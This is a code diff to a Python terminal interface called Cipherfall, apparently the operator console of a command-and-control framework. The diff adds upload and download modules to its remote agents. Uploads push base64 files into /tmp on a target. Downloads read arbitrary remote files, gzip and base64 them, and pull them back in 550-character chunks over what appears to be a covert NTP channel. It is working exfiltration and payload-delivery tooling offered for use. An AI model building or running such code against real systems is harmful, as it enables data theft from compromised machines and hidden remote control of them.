@@ -17,7 +17,7 @@ Keys:
     q       quit
 """
 
-import asyncio, json, os, pathlib, re, subprocess, sys, time
+import asyncio, base64, gzip, json, os, pathlib, re, subprocess, sys, time
 from rich.markup import escape as _escape
 from rich.text import Text
 from dotenv import load_dotenv
@@ -391,6 +391,8 @@ class CipherfallTUI(App):
     _history_idx: int = -1
     _agent_base: dict[str, str] = {}   # agent_id -> base URL
     _agents_data: dict[str, dict] = {}  # agent_id -> agent dict (includes sysinfo)
+    _download_tasks:    dict[str, dict] = {}  # task_id -> {type, ...}
+    _download_sessions: dict[str, dict] = {}  # session_id -> state
 
     # ── Layout ───────────────────────────────────────────────────────────────
 
@@ -475,6 +477,7 @@ class CipherfallTUI(App):
         self.query_one("#row-relay-port").display = False
         await self._load_agents()
         self.set_interval(5.0, self._load_agents)
+        self.set_interval(5.0, self._collect_chunks)
 
     # ── Data ─────────────────────────────────────────────────────────────────
 
@@ -580,10 +583,119 @@ class CipherfallTUI(App):
         log = self.query_one("#output-log", RichLog)
         log.clear()
         log.write(f"[bold cyan]$ {task['command']}[/bold cyan]")
-        if task.get("output"):
-            log.write(_escape(task["output"]))
-        else:
-            log.write("[dim]waiting for output…[/dim]")
+        dl = self._download_tasks.get(task_id)
+        if dl is None:
+            if task.get("output"):
+                log.write(_escape(task["output"]))
+            else:
+                log.write("[dim]waiting for output…[/dim]")
+        elif dl["type"] == "direct":
+            if task.get("output"):
+                try:
+                    data = base64.b64decode(task["output"].strip())
+                    lp = pathlib.Path(dl["local_path"])
+                    lp.parent.mkdir(parents=True, exist_ok=True)
+                    lp.write_bytes(data)
+                    log.write(f"[green]saved  {dl['remote_path']}  →  {dl['local_path']}  ({len(data)} bytes)[/green]")
+                except Exception as e:
+                    log.write(f"[red]decode error: {e}[/red]")
+                    log.write(_escape(task["output"][:400]))
+            else:
+                log.write("[dim]waiting for output…[/dim]")
+        elif dl["type"] == "count":
+            session = self._download_sessions.get(dl["session_id"], {})
+            if session.get("done"):
+                log.write(f"[green]saved  {session['remote_path']}  →  {session['local_path']}  ({session.get('size', '?')} bytes)[/green]")
+            elif session.get("queued"):
+                got   = len(session["chunks"])
+                total = session["total"]
+                log.write(f"[yellow]downloading  {session['remote_path']}  ({got}/{total} chunks)[/yellow]")
+            elif task.get("output"):
+                try:
+                    total = int(task["output"].strip())
+                except ValueError:
+                    log.write(f"[red]count error: {_escape(task['output'][:200])}[/red]")
+                    return
+                session["total"]  = total
+                session["queued"] = True
+                rp       = session["remote_path"]
+                aid      = session["agent_id"]
+                base_url = self._agent_base.get(aid, BASE)
+                log.write(f"[yellow]queuing {total} chunk{'s' if total != 1 else ''} for {rp}…[/yellow]")
+                for i in range(total):
+                    chunk_cmd = (
+                        f"python3 -c \"import gzip,base64; "
+                        f"d=open('{rp}','rb').read(); "
+                        f"b=base64.b64encode(gzip.compress(d,9,mtime=0)).decode(); "
+                        f"print(b[{i*550}:{(i+1)*550}],end='')\""
+                    )
+                    try:
+                        async with httpx.AsyncClient() as c:
+                            r2 = await c.post(f"{base_url}/admin/task",
+                                              json={"agent_id": aid, "command": chunk_cmd},
+                                              timeout=3)
+                            res = r2.json()
+                        session["chunk_tasks"][i] = res["task_id"]
+                        self._download_tasks[res["task_id"]] = {"type": "chunk", "session_id": dl["session_id"]}
+                    except Exception as e:
+                        log.write(f"[red]queue error chunk {i}: {e}[/red]")
+                        session["queued"] = False
+                        return
+                await self._load_tasks(aid)
+            else:
+                log.write("[dim]waiting for output…[/dim]")
+        elif dl["type"] == "chunk":
+            session = self._download_sessions.get(dl["session_id"], {})
+            if session.get("done"):
+                log.write(f"[green]download complete: {session['remote_path']}[/green]")
+            else:
+                chunk_idx = next((i for i, tid in session.get("chunk_tasks", {}).items() if tid == task_id), "?")
+                total     = session.get("total", "?")
+                got       = len(session.get("chunks", {}))
+                log.write(f"[yellow]chunk {chunk_idx}/{total}  ({got} received so far)[/yellow]")
+
+    async def _collect_chunks(self) -> None:
+        for session_id, session in list(self._download_sessions.items()):
+            if session.get("done") or not session.get("queued") or not session.get("total"):
+                continue
+            total    = session["total"]
+            agent_id = session["agent_id"]
+            base_url = self._agent_base.get(agent_id, BASE)
+            for idx in range(total):
+                if idx in session["chunks"]:
+                    continue
+                task_id = session["chunk_tasks"].get(idx)
+                if not task_id:
+                    continue
+                try:
+                    async with httpx.AsyncClient() as c:
+                        r = await c.get(f"{base_url}/admin/result/{task_id}", timeout=3)
+                        t = r.json()
+                    output = (t.get("output") or "").strip()
+                    if output and not output.startswith("["):
+                        session["chunks"][idx] = output
+                except Exception:
+                    pass
+            if len(session["chunks"]) < total:
+                continue
+            b64_gz = "".join(session["chunks"][i] for i in range(total))
+            try:
+                data = gzip.decompress(base64.b64decode(b64_gz))
+                lp = pathlib.Path(session["local_path"])
+                lp.parent.mkdir(parents=True, exist_ok=True)
+                lp.write_bytes(data)
+                session["done"] = True
+                session["size"] = len(data)
+                if self._selected_task and (
+                    self._download_tasks.get(self._selected_task, {}).get("session_id") == session_id
+                ):
+                    log = self.query_one("#output-log", RichLog)
+                    log.clear()
+                    log.write(f"[bold cyan]$ [download {session['remote_path']}][/bold cyan]")
+                    log.write(f"[green]saved  {session['remote_path']}  →  {session['local_path']}  ({len(data)} bytes)[/green]")
+            except Exception as e:
+                session["done"]  = True
+                session["error"] = str(e)
 
     # ── Events ───────────────────────────────────────────────────────────────
 
@@ -633,7 +745,48 @@ class CipherfallTUI(App):
             if len(self._cmd_history) > 100:
                 self._cmd_history.pop()
         self._history_idx = -1
-        if cmd.startswith("/module relay"):
+        log = self.query_one("#output-log", RichLog)
+        _download_local  = ""
+        _download_remote = ""
+        _is_ntp          = False
+        if cmd.startswith("/module upload"):
+            parts = cmd.split(None, 3)
+            if len(parts) < 3:
+                log.clear()
+                log.write("[red]usage: /module upload <local_path> [remote_path][/red]")
+                return
+            lp = pathlib.Path(parts[2]).expanduser()
+            if not lp.exists():
+                log.clear()
+                log.write(f"[red]not found: {parts[2]}[/red]")
+                return
+            data = lp.read_bytes()
+            rp = parts[3] if len(parts) > 3 else f"/tmp/{lp.name}"
+            b64 = base64.b64encode(data).decode()
+            cmd = f"echo '{b64}' | base64 -d > {rp} && echo 'uploaded {lp.name} ({len(data)}B) -> {rp}'"
+        elif cmd.startswith("/module download"):
+            parts = cmd.split(None, 3)
+            if len(parts) < 3:
+                log.clear()
+                log.write("[red]usage: /module download <remote_path> [local_path][/red]")
+                return
+            _download_remote = parts[2]
+            fname  = pathlib.Path(_download_remote).name or "download"
+            dl_dir = HERE / "downloads"
+            dl_dir.mkdir(exist_ok=True)
+            _download_local = parts[3] if len(parts) > 3 else str(dl_dir / fname)
+            a_data  = self._agents_data.get(self._selected_agent or "", {})
+            info    = json.loads(a_data.get("sysinfo") or "{}")
+            _is_ntp = info.get("worker_url", "").startswith("ntp://")
+            if _is_ntp:
+                rp  = _download_remote
+                cmd = (f"python3 -c \"import gzip,base64; "
+                       f"d=open('{rp}','rb').read(); "
+                       f"b=base64.b64encode(gzip.compress(d,9,mtime=0)).decode(); "
+                       f"print((len(b)+549)//550)\"")
+            else:
+                cmd = f"UPLOAD:{_download_remote}"
+        elif cmd.startswith("/module relay"):
             parts  = cmd.split()
             a_data = self._agents_data.get(self._selected_agent or "", {})
             info   = json.loads(a_data.get("sysinfo") or "{}")
@@ -665,7 +818,26 @@ class CipherfallTUI(App):
             return
 
         self._selected_task = result["task_id"]
-        log = self.query_one("#output-log", RichLog)
+        if _download_local:
+            tid = result["task_id"]
+            if _is_ntp:
+                self._download_sessions[tid] = {
+                    "remote_path": _download_remote,
+                    "local_path":  _download_local,
+                    "agent_id":    self._selected_agent,
+                    "total":       0,
+                    "chunks":      {},
+                    "chunk_tasks": {},
+                    "queued":      False,
+                    "done":        False,
+                }
+                self._download_tasks[tid] = {"type": "count", "session_id": tid}
+            else:
+                self._download_tasks[tid] = {
+                    "type":        "direct",
+                    "remote_path": _download_remote,
+                    "local_path":  _download_local,
+                }
         log.clear()
         log.write(f"[yellow]queued  →  task {result['task_id'][:8]}[/yellow]")
         await self._load_tasks(self._selected_agent)
